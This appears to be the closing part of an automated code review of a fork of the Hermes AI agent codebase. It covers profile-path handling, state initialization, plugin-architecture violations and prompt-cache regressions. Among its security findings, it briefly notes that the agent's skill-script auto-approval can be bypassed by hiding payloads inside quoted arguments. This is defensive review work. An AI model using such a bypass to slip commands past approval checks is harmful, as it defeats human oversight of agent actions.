**File:** `owner/scripts/cron-health-check.py:23`, `owner/checkpoint_predictor/predictor.py:26`
**Category:** profile-isolation
**Description:** Both files use `Path.home() / ".hermes"` instead of
`get_hermes_home()`. For scripts run by cron (which run under the user's
crontab), this is usually fine because cron uses `$HOME`. But for scripts
run via `hermes cron add --script ...`, the script's `Path.home()` is the
process's HOME, which may not match the active profile's HERMES_HOME.
**Evidence:**
```python
# owner/scripts/cron-health-check.py:23
HERMES_HOME = Path.home() / ".hermes"
```
**Recommendation:** For consistency with the rest of the codebase (which
uses `get_hermes_home()`), update these scripts. Note that scripts run
by cron-as-systemd may not have a sensible HOME, so consider taking
HERMES_HOME as an explicit parameter or env var override.

---

## Summary

### Top 3 issues

1. **CR-001 / CR-002 / CR-006: Security defenses have gaps.** The home-prefix
   regex can match in unexpected newline contexts, the owner/scripts exemption
   only protects the cron path (not the terminal path), and skill-script
   auto-approval can be bypassed by hiding payloads inside quoted arguments.
   These are exploit-ready.

2. **CR-003: AIAgent state initialization is incomplete.** The new
   `_auth_pool_refresh_counts` dict is reset in the per-turn prologue but
   never initialized in `__init__`. First-time-OAuth or subagent-edge cases
   will `AttributeError`.

3. **CR-004 / CR-005: Two distinct architecture regressions.** Widening
   secret-redaction bypass to API/webhook surfaces leaks credentials; MoA
   injection placed AFTER prompt-cache-sensitive stripping busts the cache
   on every turn, defeating AGENTS.md's "prompt caching is sacred" rule.

### Theme observations

- **Plugin integrity violations are pervasive.** The owner/ directory
  embeds logic directly into core files (`gateway/run.py`, `gateway/platforms/base.py`,
  `agent/system_prompt.py`, `tools/*.py`) — at least 6 monkey-patches
  applied at module-import time. This contradicts AGENTS.md's explicit
  "plugins MUST NOT modify core files" rule. Upstream sync will be a
  permanent merge nightmare.

- **The "thin glue" abstraction is aspirational, not enforced.** Many of
  the 110 files in scope are large modifications (e.g. agent/conversation_loop.py
  +410 lines, gateway/run.py +1491 lines) where the entire diff IS the
  owner logic, just relocated. The `# [owner-patch]` markers remain but
  the body is not thin.

- **Internal owner/ code is high quality.** The owner/ directory's own
  modules (clarify/, feishu/, providers/, scripts/, diff_card/) are
  well-documented, fail-open consistently, and use the recommended
  `get_hermes_home()` helper. If the same discipline were applied to
  the core-file changes, the codebase would be in better shape.

- **Test coverage is uneven.** The "可移除性" (removability) comments
  throughout owner/ are aspirational — there's no test that verifies the
  modules can be deleted without breaking core. The thin-glue patches in
  gateway/run.py have no tests at all.

- **Chinese localization is comprehensive but undocumented.** owner/tips_zh.py
  (475 lines) is a complete Chinese translation of the English tips system.
  AGENTS.md doesn't mention this fork adds Chinese localization, so a user
  reviewing PR diffs may not realize this is intentional.

### Cross-cutting architectural concerns

- **`agent/system_prompt.py` removal of volatile user name + no replacement
  for non-Feishu platforms** (CR + WR-001/013): the model can no longer
  address users by name in Telegram/Discord/Slack group chats. This is a
  user-visible regression.

- **Inconsistent owner/ vs core schema patches** (WR-011):
  `tools/image_generation_tool.py` and `owner/tools/schema_patches.py`
  fight over the `model` parameter. If owner/ is removed (per documented
  behavior), the schema silently changes.

- **Cron owner/scripts exemption is asymmetric** (CR-002): the same file
  is rejected via `cronjob()` but accepted via `terminal()`. Either both
  should be gated or neither.

- **MoA injection placement** (CR-005): the most invasive cache-busting
  change. Documenting this as a per-turn cache cost (or moving to the
  prefill slot) is the minimum mitigation.

- **Hermes-state initialization** (CR-003): a recurring pattern across
  the diffs — new per-agent counters and caches are reset in
  `run_conversation()` rather than `__init__`. This is a maintenance
  hazard; future per-agent state needs a single initialization point.

### Recommendation: **fix-required**

The fork is too large and too invasive to ship as-is. Six blocker-class
issues need fixes before this reaches production:

1. CR-001: tighten home-prefix regex to exclude newlines
2. CR-002: decide on owner/scripts exemption scope (cron-only or terminal-only)
3. CR-003: initialize `_auth_pool_refresh_counts` in `__init__`
4. CR-004: drop `api_server` and `webhook` from `_GATEWAY_RAW_TEXT_PLATFORMS`
5. CR-005: move MoA injection to the prefill slot or make it opt-in
6. CR-006: require explicit re-confirmation for compound commands in
   skill-script auto-approval

After the blockers are fixed, the warning-class issues should be
addressed in the same release cycle to avoid a follow-up cleanup PR.
The plugin-architecture violations (WR-017) are a separate long-term
project: the owner/ directory should either be migrated to the plugin
ABC or formally documented as a feature fork with a clear "removing owner/
requires reverting N commits" disclaimer.

---

_Reviewed: 2026-07-02_
_Reviewer: gsd-code-reviewer_
_Depth: standard_